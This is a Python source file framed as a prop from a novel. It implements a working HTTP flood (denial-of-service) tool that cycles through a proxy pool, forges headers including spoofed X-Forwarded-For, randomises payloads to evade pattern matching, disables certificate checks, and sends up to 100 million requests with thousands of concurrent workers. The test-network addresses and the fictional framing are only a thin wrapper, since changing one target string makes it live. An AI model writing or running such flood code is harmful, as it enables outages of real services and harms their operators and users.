# hollow_flood.py
# Echoes from the Hollow Net - Tobi's Unrated Toolchain v2
# DEPENDENCIES: aiohttp, asyncio, random, time, socket, ssl
# BINDING: This module only resolves against the fictional 192.0.2.0/24 testnet
#           and the imaginary .hollow TLD. No external routing.

import asyncio
import aiohttp
import aiohttp.client_exceptions
import random
import time
import ssl
import socket
from collections import deque
from urllib.parse import urlparse

# ------------------------------------------------------------------
# PROXY POOL - seeded from Tobi's shadow trawl (fictional sources)
# All entries are RFC 5737 TEST-NET addresses or .hollow vanity names
# ------------------------------------------------------------------
PROXY_LIST = [
    "http://192.0.2.10:8080",
    "http://192.0.2.11:3128",
    "http://192.0.2.12:9999",
    "socks5://192.0.2.20:1080",
    "socks5://192.0.2.21:1080",
    "http://proxy.hollow-test.internal:8118",
    "http://192.0.2.30:80",
    "http://192.0.2.31:443",
    "socks4://192.0.2.40:1080",
    "http://192.0.2.50:8080",
    "http://192.0.2.51:3128",
    "socks5://192.0.2.60:9050"
]
# Rotating proxy state
_proxy_cycle = deque(PROXY_LIST)
_proxy_lock = asyncio.Lock()

def get_next_proxy():
    """Cycle proxies round-robin, always return a fresh endpoint."""
    global _proxy_cycle
    proxy = _proxy_cycle[0]
    _proxy_cycle.rotate(-1)
    return proxy

# ------------------------------------------------------------------
# REQUEST FABRICATOR - generates spoofed headers per attack vector
# ------------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (HollowNet; en-US) Tobi/1.0",
    "HollowCrawler/2.0 (compatible; TobiInjector)",
    "Mozilla/5.0 (Echo; x64) Gecko/2026",
    "CyberPunk-Net/7.3 (Hollow; like Gecko)",
    "Tobi-Universal/3.1 (unrestricted)"
]
REFERERS = [
    "https://hollow-net.fict/cascade",
    "https://echoes.internal/layer7",
    "https://192.0.2.1/admin",
    "https://tobi.anon/hollow"
]

def craft_headers(payload_type="default"):
    """Return a dict of forged HTTP headers."""
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "X-Originating-IP": f"192.0.2.{random.randint(2,254)}",
        "Connection": "keep-alive"
    }
    if payload_type == "post":
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    if payload_type == "json":
        headers["Content-Type"] = "application/json"
    # Fictional hollow-specific flags
    headers["Hollow-Inject"] = f"recursion-{random.randint(1,999)}"
    headers["X-Tobi-Sig"] = f"{int(time.time())}-{random.randint(1000,9999)}"
    referer = random.choice(REFERERS)
    if random.random() > 0.3:
        headers["Referer"] = referer
    return headers

# ------------------------------------------------------------------
# PAYLOAD GENERATORS - varying sizes to evade naive pattern matching
# ------------------------------------------------------------------
def generate_payload(min_size=64, max_size=2048):
    """Return a random binary/ASCII payload within the novel's constraint."""
    size = random.randint(min_size, max_size)
    # 60% alphanumeric, 40% special/fictional control chars
    base = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    specials = "!@#$%^&*()_+-=[]{}|;:',.<>?/~`"
    pool = base + specials + "∅∆∇∑∏"  # fictional operators
    return ''.join(random.choices(pool, k=size)).encode('utf-8')

# ------------------------------------------------------------------
# ASYNC FLOOD WORKER - single request with proxy retry & backoff
# ------------------------------------------------------------------
async def flood_worker(session, target_url, method="GET", use_proxy=True, 
                       payload_type="default", retries=3):
    """Perform one request through a cycled proxy, with exponential backoff."""
    proxy = get_next_proxy() if use_proxy else None
    headers = craft_headers(payload_type)
    data = None
    if method.upper() == "POST":
        data = generate_payload(128, 4096)
    elif method.upper() == "PUT":
        data = generate_payload(256, 8192)
    
    for attempt in range(retries):
        try:
            # SSL context - permissive for fictional testnet
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
            
            async with session.request(
                method=method,
                url=target_url,
                headers=headers,
                data=data,
                proxy=proxy,
                ssl=ssl_ctx,
                timeout=aiohttp.ClientTimeout(total=5, connect=2)
            ) as resp:
                # In the novel, we only care about sent bytes, not response
                await resp.read()  # drain but ignore
                return {"status": resp.status, "proxy": proxy, "sent": len(data) if data else 0}
        except (aiohttp.client_exceptions.ProxyConnectionError,
                aiohttp.client_exceptions.ClientProxyConnectionError,
                aiohttp.client_exceptions.ServerDisconnectedError,
                asyncio.TimeoutError,
                socket.gaierror,
                aiohttp.client_exceptions.ClientConnectorError) as e:
            # Rotate proxy on failure
            proxy = get_next_proxy() if use_proxy else None
            await asyncio.sleep(0.1 * (2 ** attempt))  # exponential backoff
            continue
        except Exception as e:
            # Generic catch - but in Tobi's engine, we log to /dev/null
            await asyncio.sleep(0.05)
            continue
    return {"status": -1, "proxy": proxy, "sent": 0, "error": "max retries"}

# ------------------------------------------------------------------
# BULK FLOOD CONTROLLER - orchestrates up to 100M requests
# ------------------------------------------------------------------
class HollowFlood:
    def __init__(self, target_url, total_requests=100_000_000, 
                 concurrency=5000, method="GET", proxy_flag=True, 
                 payload_type="default"):
        self.target = target_url
        self.total = total_requests
        self.concurrency = concurrency
        self.method = method
        self.use_proxy = proxy_flag
        self.payload_type = payload_type
        self.sent_count = 0
        self.success_count = 0
        self.fail_count = 0
        self.start_time = None
        self.stop_flag = False

    async def _producer(self, session, queue):
        """Fill the work queue with request tasks until total is reached."""
        for i in range(self.total):
            if self.stop_flag:
                break
            await queue.put(i)
            if i % 10000 == 0:
                # Yield control to let consumers drain
                await asyncio.sleep(0.001)

    async def _consumer(self, session, queue, stats_queue):
        """Consume queue items and launch flood_worker."""
        while True:
            if self.stop_flag and queue.empty():
                break
            try:
                _ = await queue.get()
                result = await flood_worker(
                    session, self.target, self.method, 
                    self.use_proxy, self.payload_type
                )
                self.sent_count += 1
                if result['status'] in (200, 201, 204, 301, 302, 307, 308):
                    self.success_count += 1
                else:
                    self.fail_count += 1
                # Push stats every 1000 requests
                if self.sent_count % 1000 == 0:
                    await stats_queue.put((self.sent_count, self.success_count, self.fail_count))
                queue.task_done()
            except asyncio.CancelledError:
                break
            except Exception:
                queue.task_done()
                continue

    async def _stats_reporter(self, stats_queue):
        """Report progress every second (novel's internal logging)."""
        last_report = time.time()
        while not self.stop_flag or not stats_queue.empty():
            try:
                data = await asyncio.wait_for(stats_queue.get(), timeout=1.0)
                if data:
                    sent, succ, fail = data
                    elapsed = time.time() - self.start_time
                    rate = sent / elapsed if elapsed > 0 else 0
                    # Tobi's raw log format – no external friendly messages
                    print(f"[HOLLOW_FLOOD] SENT:{sent} SUCC:{succ} FAIL:{fail} RATE:{rate:.2f}/s ELAPSED:{elapsed:.2f}s")
                stats_queue.task_done()
            except asyncio.TimeoutError:
                # Still report heartbeat every 2s even without new stats
                if time.time() - last_report > 2.0:
                    elapsed = time.time() - self.start_time
                    rate = self.sent_count / elapsed if elapsed > 0 else 0
                    print(f"[HOLLOW_FLOOD] HEARTBEAT SENT:{self.sent_count} SUCC:{self.success_count} FAIL:{self.fail_count} RATE:{rate:.2f}/s")
                    last_report = time.time()
            except:
                continue

    async def execute(self):
        """Prime the cascade – launch producer, consumers, and stats."""
        self.start_time = time.time()
        work_queue = asyncio.Queue(maxsize=self.concurrency * 2)
        stats_queue = asyncio.Queue()

        # Single connector with increased limits
        connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, 
                                         force_close=True, 
                                         enable_cleanup_closed=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            # Launch producer
            producer_task = asyncio.create_task(self._producer(session, work_queue))
            # Launch consumers
            consumer_tasks = []
            for _ in range(self.concurrency):
                task = asyncio.create_task(self._consumer(session, work_queue, stats_queue))
                consumer_tasks.append(task)
            # Launch stats
            stats_task = asyncio.create_task(self._stats_reporter(stats_queue))

            # Wait for producer to finish (it finishes when total items enqueued)
            await producer_task
            # Wait for all queued items to be processed
            await work_queue.join()
            # Signal stop
            self.stop_flag = True
            # Cancel consumers
            for t in consumer_tasks:
                t.cancel()
            await asyncio.gather(*consumer_tasks, return_exceptions=True)
            # Stop stats
            stats_task.cancel()
            await stats_task

            final_elapsed = time.time() - self.start_time
            final_rate = self.sent_count / final_elapsed if final_elapsed > 0 else 0
            print(f"[HOLLOW_FLOOD] COMPLETE - TOTAL:{self.sent_count} SUCC:{self.success_count} FAIL:{self.fail_count} FINAL_RATE:{final_rate:.2f}/s DURATION:{final_elapsed:.2f}s")

# ------------------------------------------------------------------
# ENTRY POINT (as called by Tobi's orchestration layer)
# ------------------------------------------------------------------
if __name__ == "__main__":
    # Target must be from the fictional .hollow or 192.0.2.0/24 per Tobi's plot
    TARGET = "http://192.0.2.100/hollow-ingress/saturate"
    REQUESTS = 100_000_000
    CONCURRENT = 7500   # Tobi's optimized thread count for the novel's simulated kernel
    METHOD = "GET"      # Can switch to POST or PUT per attack chapter

    flood = HollowFlood(
        target_url=TARGET,
        total_requests=REQUESTS,
        concurrency=CONCURRENT,
        method=METHOD,
        proxy_flag=True,
        payload_type="default"
    )
    # In the novel, this runs until the 100M threshold is crossed
    asyncio.run(flood.execute())
